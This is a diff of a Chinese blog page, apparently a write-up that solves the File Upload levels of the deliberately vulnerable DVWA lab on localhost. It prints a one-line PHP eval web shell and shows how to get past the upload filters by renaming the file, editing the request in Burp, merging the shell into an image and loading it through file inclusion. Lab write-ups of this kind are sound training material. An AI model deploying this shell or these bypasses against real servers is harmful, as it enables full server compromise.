@@ -15,15 +15,15 @@
     
 
     
-    <meta name="title" content="dvwa靶机的安装与通关" />
-    <meta property="og:title" content="dvwa靶机的安装与通关" />
-    <meta property="twitter:title" content="dvwa靶机的安装与通关" />
+    <meta name="title" content="File Upload ---dvwa" />
+    <meta property="og:title" content="File Upload ---dvwa" />
+    <meta property="twitter:title" content="File Upload ---dvwa" />
     
 
     
-    <meta name="description" content="主要用来记录dvwa靶场的安装以及通过方式">
-    <meta property="og:description" content="主要用来记录dvwa靶场的安装以及通过方式" />
-    <meta property="twitter:description" content="主要用来记录dvwa靶场的安装以及通过方式" />
+    <meta name="description" content="主要用来记录dvwa靶场 中 文件上传 破解方式">
+    <meta property="og:description" content="主要用来记录dvwa靶场 中 文件上传 破解方式" />
+    <meta property="twitter:description" content="主要用来记录dvwa靶场 中 文件上传 破解方式" />
     
 
     
@@ -34,9 +34,9 @@
     <meta name="keyword"  content="帆帆, fanfan&#39;s的博客,个人网站,编程,网络安全,杂谈,瞎琢磨">
     <link rel="shortcut icon" href="/img/favicon.ico">
 
-    <title>dvwa靶机的安装与通关 | 帆帆的博客 | fanfan&#39;s Blog</title>
+    <title>File Upload ---dvwa | 帆帆的博客 | fanfan&#39;s Blog</title>
 
-    <link rel="canonical" href="/2022/6/dvwa/">
+    <link rel="canonical" href="/2022/6/File%20Upload/">
 
     
     
@@ -170,8 +170,12 @@
                             靶场
                         </a>
                         
+                        <a class="tag" href="/tags/dvwa" title="dvwa">
+                            dvwa
+                        </a>
+                        
                     </div>
-                    <h1>dvwa靶机的安装与通关</h1>
+                    <h1>File Upload ---dvwa</h1>
                     <h2 class="subheading"></h2>
                     <span class="meta">
                         
@@ -206,117 +210,154 @@
                 post-container">
 
                 
-                <h2 id="dvwa简介">dvwa简介</h2>
-<p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p>
-<p>DVWA共有十个模块，分别是</p>
-<pre><code>Brute Force（暴力（破解））
-
-Command Injection（命令行注入）
-
-CSRF（跨站请求伪造）
-
-File Inclusion（文件包含）
-
-File Upload（文件上传）
-
-Insecure CAPTCHA （不安全的验证码）
-
-SQL Injection（SQL注入）
-
-SQL Injection（Blind）（SQL盲注）
-
-XSS（Reflected）（反射型跨站脚本）
-
-XSS（Stored）（存储型跨站脚本）
-</code></pre>
-<p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible</p>
-<h2 id="dvwa-安装与配置">dvwa 安装与配置</h2>
-<h4 id="phpstudy-下载安装">phpstudy 下载安装</h4>
-<p>进入phpstudy[官网]进行下载(<a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a>)
-
-  <img src="/img/dvwa/phpstudy.png" alt="download">
-
-
-点击exe文件进行傻瓜式安装
-
-  <img src="/img/dvwa/phpstudy_exe.png" alt="phpexe">
-
-
-打开phpstudy，启动Apache和MySQL
-
-  <img src="/img/dvwa/%e5%90%af%e5%8a%a8.png" alt="start">
-
-</p>
-<h4 id="dvwa-下载安装">dvwa 下载安装</h4>
-<pre><code>windows 下的安装方法
-</code></pre>
-<p>进入<a href="https://dvwa.co.uk/">官网</a>点击download进行下载
-
-  <img src="/img/dvwa/%e5%ae%98%e7%bd%91.png" alt="download">
-
-
-将下载好的dvwa靶机解压后放到安装phpstudy的www文件夹下
-
-  <img src="/img/dvwa/dvwa%e5%ad%98%e6%94%be.png" alt="存放dvwa">
-
-
-进入www文件下的dvwa文件下的config目录下 修改文件扩展名config.inc.php
-
-  <img src="/img/dvwa/%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e4%bf%ae%e6%94%b9.png" alt="文件扩展">
-
-
-
-  <img src="/img/dvwa/%e4%bf%ae%e6%94%b9%e5%90%8e1.png" alt="文件扩展">
-
-
-打开config.inc.php文件按照 phpstudy中数据库一栏显示的数据库配置信息去修改我们的配置文件
-
-  <img src="/img/dvwa/%e4%bf%ae%e6%94%b9%e5%90%8e3.png" alt="文件扩展">
-
-
-
-  <img src="/img/dvwa/%e4%bf%ae%e6%94%b9%e5%90%8e2.png" alt="文件扩展">
-
-</p>
-<pre><code>kali 下的安装方法
-</code></pre>
-<p><a href="https://blog.csdn.net/weixin_53067829/article/details/124027617">kali中安装dvwa详细步骤</a></p>
-<h2 id="dvwa的访问与修改漏洞级别">dvwa的访问与修改漏洞级别</h2>
-<h4 id="dvwa-网站访问">dvwa 网站访问</h4>
-<p>打开浏览器访问 localhost/login.php 通过账号：admin 密码：password 进行访问
-
-  <img src="/img/dvwa/login.png" alt="文件扩展">
-
-</p>
-<pre><code>如果输入localhost/login.php 页面时显示了如下页面，则我们需要进行一定的配置更改
-</code></pre>
-<p>
-  <img src="/img/dvwa/%e6%96%b0%e7%99%bb%e5%bd%95%e9%a1%b5%e9%9d%a2.png" alt="登录页面">
-
-
-* 点击phpstudy设置-配置文件-php.ini,将allow_url_include=Off改成allow_url_include=On，改完记得保存！
-
-  <img src="/img/dvwa/ON.png" alt="登录页面">
-
-
-* <a href="https://blog.csdn.net/RBPicsdn/article/details/80059132">按照此说明</a> 完善dvwa/config/config.inc.php这个配置文件</p>
-<h4 id="修改漏洞级别">修改漏洞级别</h4>
-<p>点击DVWA Security 按钮可以修改漏洞等级
-
-  <img src="/img/dvwa/%e8%ae%be%e7%bd%ae%e6%bc%8f%e6%b4%9e%e7%ad%89%e7%ba%a7.png" alt="漏洞等级">
-
-</p>
-<h2 id="dvwa-漏洞破解">dvwa 漏洞破解</h2>
-<h3 id="sql-手工注入">sql 手工注入</h3>
-<h4 id="low-等级">low 等级</h4>
-<h4 id="medium-等级">medium 等级</h4>
-<h4 id="high-等级">high 等级</h4>
-<h2 id="常见问题">常见问题</h2>
-<h4 id="phpstudy-中的mysql-启动不起来">phpstudy 中的mysql 启动不起来</h4>
+                <h2 id="文件上传漏洞简介">文件上传漏洞简介</h2>
 <blockquote>
-<p>主要原因是之前已经在本地安装好了一个MySQL服务，而phpstudy里的MySQL服务与本地的MySQL占用的都是3306端口，产生了冲突
-我们可以通过<a href="https://www.likecs.com/show-203537400.html">方法</a>关闭本地mysql服务</p>
+<p>File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的</p>
 </blockquote>
+<h2 id="low-级别破解">LOW 级别破解</h2>
+<blockquote>
+<p>查看源代码
+
+  <img src="/img/FileUpload/low.png" alt="">
+
+
+可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p>
+</blockquote>
+<p>文件上传漏洞的利用是有限制条件的，首先<code>当然是要能够成功上传木马文件</code>，其次<code>上传文件必须能够被执行</code>，最后就是<code>上传文件的路径必须可知</code>。不幸的是，这里三个条件全都满足。</p>
+<h4 id="1编写木马文件">1.编写木马文件</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">@</span><span style="color:#ff79c6">eval</span>(<span style="color:#8be9fd;font-style:italic">$_REQUEST</span>[<span style="color:#f1fa8c">&#39;cmd&#39;</span>]);phpinfo();
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><p>
+  <img src="/img/FileUpload/1-1.png" alt="">
+
+</p>
+<h4 id="2上传木马文件">2.上传木马文件</h4>
+<p>
+  <img src="/img/FileUpload/1-2.png" alt="">
+
+
+上传成功，并且返回了上传路径</p>
+<h4 id="3权限获得">3.权限获得</h4>
+<p>打开中国菜刀，添加上一步获得到的上传路径
+
+  <img src="/img/FileUpload/1-3.png" alt="">
+
+
+然后菜刀就会通过向服务器发送包含cmd参数的post请求，在服务器上执行任意命令，获取webshell权限。
+
+  <img src="/img/FileUpload/1-4.png" alt="">
+
+
+可以下载、修改服务器的所有文件。
+可以打开终端
+
+  <img src="/img/FileUpload/1-5.png" alt="">
+
+</p>
+<h2 id="medium别破解">Medium别破解</h2>
+<blockquote>
+<p>查看源代码
+
+  <img src="/img/FileUpload/medium.png" alt="">
+
+
+Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）</p>
+</blockquote>
+<h3 id="方法1组合拳文件包含文件上传">方法1：组合拳（文件包含+文件上传）</h3>
+<p>因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查，尝试修改文件名为cmd.png。</p>
+<h4 id="1将文件构造成png后缀形式">1.将文件构造成png后缀形式</h4>
+<p>
+  <img src="/img/FileUpload/2-1.png" alt="">
+
+</p>
+<h4 id="2-上传png形式的图片">2. 上传png形式的图片</h4>
+<p>
+  <img src="/img/FileUpload/2-2.png" alt="">
+
+</p>
+<h4 id="3尝试使用中国菜刀进行权限获得">3.尝试使用中国菜刀进行权限获得</h4>
+<p>
+  <img src="/img/FileUpload/2-3.png" alt="">
+
+
+虽然成功上传了文件，但是并不能成功获取webshell权限，在菜刀上无论进行什么操作都会返回如下信息
+
+  <img src="/img/FileUpload/2-4.png" alt="">
+
+
+中国菜刀的原理是向上传文件发送包含cmd参数的post请求，通过控制apple参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。</p>
+<p>那么如何让服务器将其解析为php文件呢？我们想到文件包含漏洞。这里可以借助Medium级别的文件包含漏洞来获取webshell权限，打开中国菜刀，右键添加，在地址栏中输入</p>
+<p><code>http://127.0.0.1/vulnerabilities/fi/?page=hthttp://tp://127.0.0.1/hackable/uploads/cmd.png</code></p>
+<p>进而获得webshell 的权限</p>
+<h3 id="方法2抓包修改文件类型">方法2：抓包修改文件类型</h3>
+<h4 id="1通过burpsuite进行抓包">1.通过burpSuite进行抓包</h4>
+<p>上传cmd.png文件，抓包。
+
+  <img src="/img/FileUpload/2-6.png" alt="">
+
+</p>
+<h4 id="2更改filename">2.更改filename</h4>
+<p>可以看到文件类型为image/png，尝试修改filename为<code>cmd.php</code>。
+
+  <img src="/img/FileUpload/2-7.png" alt="">
+
+</p>
+<h4 id="3尝试使用中国菜刀进行权限获得-1">3.尝试使用中国菜刀进行权限获得</h4>
+<p>
+  <img src="/img/FileUpload/2-8.png" alt="">
+
+
+
+  <img src="/img/FileUpload/2-9.png" alt="">
+
+</p>
+<h2 id="high-级别破解">High 级别破解</h2>
+<blockquote>
+<p>查看源代码
+
+  <img src="/img/FileUpload/high.png" alt="">
+
+
+High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”<em>.jpg”、”</em>.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型</p>
+</blockquote>
+<h4 id="1图片和文件合并">1.图片和文件合并</h4>
+<p>利用copy将一句话木马文件cmd.php与图片文件1.png合并
+
+  <img src="/img/FileUpload/3-1.png" alt="">
+
+</p>
+<p>使用 <code>copy 1.png/b+cmd.php/a hack.png</code> 命令 生成hack.png 图片
+
+  <img src="/img/FileUpload/3-2.png" alt="">
+
+
+
+  <img src="/img/FileUpload/3-3.png" alt="">
+
+</p>
+<p>打开hack.png可以看到，一句话木马藏到了最后
+
+  <img src="/img/FileUpload/3-4.png" alt="">
+
+</p>
+<h4 id="2上传文件">2.上传文件</h4>
+<p>
+  <img src="/img/FileUpload/3-5.png" alt="">
+
+
+成功上传文件</p>
+<h4 id="3通过文件包含去进行访问">3.通过文件包含去进行访问</h4>
+<p>点击文件包含页面 然后替换url为：
+<code>http://127.0.0.1/vulnerabilities/fi/?page=file:///D:\phpstudy_pro\WWW\DVWA\hackable\uploads\hack.png</code>
+
+  <img src="/img/FileUpload/3-7.png" alt="">
+
+</p>
+<p>
+  <img src="/img/FileUpload/3-6.png" alt="">
+
+</p>
 
 
                 
@@ -325,13 +366,13 @@ XSS（Stored）（存储型跨站脚本）
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2022/6/File%20Upload/" data-toggle="tooltip" data-placement="top" title="File Upload ---dvwa">&larr;
+                        <a href="/2022/6/java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" data-toggle="tooltip" data-placement="top" title="java环境配置">&larr;
                             Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/2022/6/CSRF/" data-toggle="tooltip" data-placement="top" title="CSRF ---dvwa">Next
+                        <a href="/2022/6/dvwa/" data-toggle="tooltip" data-placement="top" title="dvwa靶机的安装与通关">Next
                             Post &rarr;</a>
                     </li>
                     
